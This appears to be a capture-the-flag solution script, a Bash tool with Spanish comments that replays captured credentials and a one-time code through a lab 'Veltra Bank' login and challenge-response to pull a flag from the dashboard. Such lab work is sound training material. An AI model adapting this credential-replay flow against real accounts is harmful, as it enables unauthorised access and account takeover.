#!/usr/bin/env bash
# Replay del login de Veltra Bank con credenciales capturadas.
# Uso:  ./login.sh <usuario> <clave> <codigo>
set -euo pipefail

BASE="https://chl-8385f7f2-ef19-460a-a633-d25c900f1721-veltra-bank.softwareseguro.com.ar"

if [ "$#" -ne 3 ]; then
  echo "uso: $0 <usuario> <clave> <codigo>" >&2
  exit 1
fi
USUARIO="$1"; CLAVE="$2"; CODIGO="$3"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

echo "[1] /api/login"
curl -s -c "$JAR" -b "$JAR" -X POST "$BASE/api/login" \
  -H 'Content-Type: application/json' \
  -d "$(jq -nc --arg u "$USUARIO" --arg c "$CLAVE" '{usuario:$u,clave:$c}')"; echo

echo "[2] /api/challenge"
NONCE="$(curl -s -c "$JAR" -b "$JAR" "$BASE/api/challenge" | jq -r .nonce)"
echo "    nonce=$NONCE"

RESP="$(printf '%s' "$NONCE:$CODIGO" | sha256sum | cut -d' ' -f1)"
echo "[3] /api/verificar (respuesta=$RESP)"
curl -s -c "$JAR" -b "$JAR" -X POST "$BASE/api/verificar" \
  -H 'Content-Type: application/json' \
  -d "$(jq -nc --arg r "$RESP" '{respuesta:$r}')"; echo

echo "[4] /dashboard -> flag"
curl -s -c "$JAR" -b "$JAR" "$BASE/dashboard" | grep -ioE 'flag\{[^}]+\}' || {
  echo "    (sin match de flag; vuelco el dashboard a /tmp/dashboard.html)"
  curl -s -c "$JAR" -b "$JAR" "$BASE/dashboard" > /tmp/dashboard.html
  echo "    revisa /tmp/dashboard.html"
}
